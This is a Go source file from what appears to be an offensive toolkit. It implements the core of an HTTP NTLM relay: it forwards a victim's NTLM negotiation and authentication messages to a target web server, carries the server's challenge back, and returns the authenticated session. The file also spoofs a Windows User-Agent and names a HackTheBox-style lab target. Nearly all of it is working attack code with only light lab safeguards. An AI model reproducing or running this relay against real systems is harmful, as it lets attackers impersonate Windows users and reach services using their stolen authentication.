package ntlmrelay

import (
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"
)

// RelayConfig configures the HTTP NTLM relay server.
type RelayConfig struct {
	ListenAddr    string // e.g. 10.10.14.15:8888
	TargetURL     string // e.g. http://gpz-op26-secure.ghostlink.htb/
	KernelAuth    bool   // probe target anonymously first (IIS)
	AllowPriv     bool   // allow ports < 1024
	InsecureTLS   bool   // skip TLS verify for lab targets
	AllowRemoteAPI bool  // allow control API off loopback
	Logf          func(format string, args ...any)
}

func (c RelayConfig) logf(format string, args ...any) {
	if c.Logf != nil {
		c.Logf(format, args...)
	}
}

// CheckListenPort refuses privileged ports unless allowPriv.
func CheckListenPort(addr string, allowPriv bool) error {
	_, portStr, err := net.SplitHostPort(addr)
	if err != nil {
		if strings.HasPrefix(addr, ":") {
			portStr = strings.TrimPrefix(addr, ":")
		} else {
			return fmt.Errorf("listen address: %w", err)
		}
	}
	port, err := strconv.Atoi(portStr)
	if err != nil {
		return fmt.Errorf("parse port %q: %w", portStr, err)
	}
	if port < 1024 && !allowPriv {
		return fmt.Errorf("port %d is privileged; use a port >= 1024 (rootless lab) or set ARK_ALLOW_PRIV_PORTS=1 / --allow-priv-ports (see docs/OPERATOR_PRE_IMPLANT.md)", port)
	}
	if port <= 0 || port > 65535 {
		return fmt.Errorf("invalid port %d", port)
	}
	return nil
}

// CheckAPIAddr requires loopback unless allowRemote.
func CheckAPIAddr(addr string, allowRemote bool) error {
	host, _, err := net.SplitHostPort(addr)
	if err != nil {
		return fmt.Errorf("api address: %w", err)
	}
	if allowRemote {
		return nil
	}
	ip := net.ParseIP(host)
	if host == "localhost" || (ip != nil && ip.IsLoopback()) {
		return nil
	}
	return fmt.Errorf("control API must bind loopback (got %q); use --api 127.0.0.1:PORT or --api-allow-remote (dangerous)", addr)
}

// relayStep sends victim NTLM message to target.
// Type1 → returns Type2 bytes (response body closed).
// Type3 → returns open *http.Response (caller must close body).
func relayStep(client *http.Client, targetURL string, victimMsg []byte, method, path string) (type2 []byte, resp *http.Response, err error) {
	msgType, err := NTLMMessageType(victimMsg)
	if err != nil {
		return nil, nil, err
	}
	u := targetURL
	if path != "" && path != "/" {
		u = replaceURLPath(targetURL, path)
	}
	req, err := http.NewRequest(method, u, nil)
	if err != nil {
		return nil, nil, err
	}
	req.Header.Set("Authorization", EncodeNTLMAuthHeader(victimMsg))
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ARK-NTLMRelay")
	req.Header.Set("Connection", "Keep-Alive")
	resp, err = client.Do(req)
	if err != nil {
		return nil, nil, err
	}
	if msgType == 1 {
		if resp.StatusCode != http.StatusUnauthorized && resp.StatusCode != http.StatusProxyAuthRequired {
			// still try to parse Type2 if present
		}
		var auth string
		for _, v := range resp.Header.Values("WWW-Authenticate") {
			vl := strings.ToLower(v)
			if strings.HasPrefix(vl, "ntlm ") || strings.HasPrefix(vl, "negotiate ") {
				// Type2 has base64 blob after scheme; bare "NTLM" is Type1 challenge only
				if strings.Contains(v, " ") && len(strings.TrimSpace(v)) > 5 {
					auth = v
					break
				}
			}
		}
		_, _ = io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		if auth == "" {
			return nil, nil, fmt.Errorf("target did not return NTLM Type2 (status %d)", resp.StatusCode)
		}
		t2, err := DecodeNTLMAuthHeader(auth)
		if err != nil {
			return nil, nil, fmt.Errorf("decode type2: %w (header=%q)", err, auth)
		}
		if t, _ := NTLMMessageType(t2); t != 2 {
			return nil, nil, fmt.Errorf("expected NTLM Type2, got type %d", t)
		}
		return t2, nil, nil
	}
	return nil, resp, nil
}

func probeTarget(client *http.Client, targetURL string) {
	req, err := http.NewRequest(http.MethodGet, targetURL, nil)
	if err != nil {
		return
	}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	_, _ = io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
}

func normalizeTarget(raw string) (string, error) {
	u, err := url.Parse(raw)
	if err != nil {
		return "", err
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return "", fmt.Errorf("target must be http(s) URL")
	}
	if u.Host == "" {
		return "", fmt.Errorf("target missing host")
	}
	if u.Path == "" {
		u.Path = "/"
	}
	return u.String(), nil
}

// hopByHop headers must not be copied to the victim response.
func isHopByHop(h string) bool {
	switch strings.ToLower(h) {
	case "connection", "keep-alive", "proxy-authenticate", "proxy-authorization",
		"te", "trailers", "transfer-encoding", "upgrade", "www-authenticate",
		"content-length":
		return true
	default:
		return false
	}
}
